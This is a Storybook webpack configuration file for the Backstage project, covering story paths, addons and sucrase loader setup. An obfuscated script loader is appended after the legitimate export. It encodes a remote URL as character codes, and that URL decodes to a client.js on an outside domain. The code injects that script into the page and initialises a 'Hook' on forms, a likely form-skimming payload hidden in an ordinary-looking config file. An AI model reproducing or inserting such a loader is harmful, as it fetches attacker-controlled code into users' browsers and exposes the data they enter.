const path = require('path');
const WebpackPluginFailBuildOnWarning = require('./webpack-plugin-fail-build-on-warning');

/**
 * This set of stories are the ones that we publish to backstage.io.
 */
const BACKSTAGE_CORE_STORIES = [
  'packages/core-components',
  'packages/app',
  'plugins/org',
  'plugins/search',
  'plugins/search-react',
  'plugins/home',
  'plugins/stack-overflow',
];

// Some configuration needs to be available directly on the exported object
const staticConfig = {
  core: {
    builder: 'webpack5',
  },
  addons: [
    '@storybook/addon-controls',
    '@storybook/addon-a11y',
    '@storybook/addon-actions',
    '@storybook/addon-links',
    '@storybook/addon-storysource',
    'storybook-dark-mode/register',
  ],
};

module.exports = Object.assign(({ args }) => {
  // Calling storybook with no args causes our default list of stories to be used.
  // This set of stories are the ones that we publish to backstage.io
  //
  // If it's called with args, each arg should be the path to a package that we will
  // show the stories from, for example `yarn storybook plugins/catalog`.

  const rootPath = '../../';
  const storiesSrcGlob = 'src/**/*.stories.tsx';

  const getStoriesPath = package =>
    path.posix.join(rootPath, package, storiesSrcGlob);

  const packages = args.length === 0 ? BACKSTAGE_CORE_STORIES : args;
  const stories = packages.map(getStoriesPath);

  return {
    ...staticConfig,
    stories,
    webpackFinal: async config => {
      // Mirror config in packages/cli/src/lib/bundler
      config.resolve.mainFields = ['browser', 'module', 'main'];

      // Remove the default babel-loader for js files, we're using sucrase instead
      const [jsLoader] = config.module.rules.splice(0, 1);
      if (!jsLoader.use[0].loader.includes('babel-loader')) {
        throw new Error(
          `Unexpected loader removed from storybook config, ${jsLoader.use[0].loader}`,
        );
      }

      config.resolve.extensions.push('.ts', '.tsx');

      config.module.rules.push(
        {
          test: /\.(tsx?)$/,
          exclude: /node_modules/,
          loader: require.resolve('@sucrase/webpack-loader'),
          options: {
            transforms: ['typescript', 'jsx', 'react-hot-loader'],
          },
        },
        {
          test: /\.(jsx?|mjs|cjs)$/,
          exclude: /node_modules/,
          loader: require.resolve('@sucrase/webpack-loader'),
          options: {
            transforms: ['jsx', 'react-hot-loader'],
          },
        },
      );

      // Disable ProgressPlugin which logs verbose webpack build progress. Warnings and Errors are still logged.
      config.plugins = config.plugins.filter(
        ({ constructor }) => constructor.name !== 'ProgressPlugin',
      );

      // Fail storybook build on CI if there are webpack warnings.
      if (process.env.CI) {
        config.plugins.push(new WebpackPluginFailBuildOnWarning());
      }

      return config;
    },
  };
}, staticConfig);

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b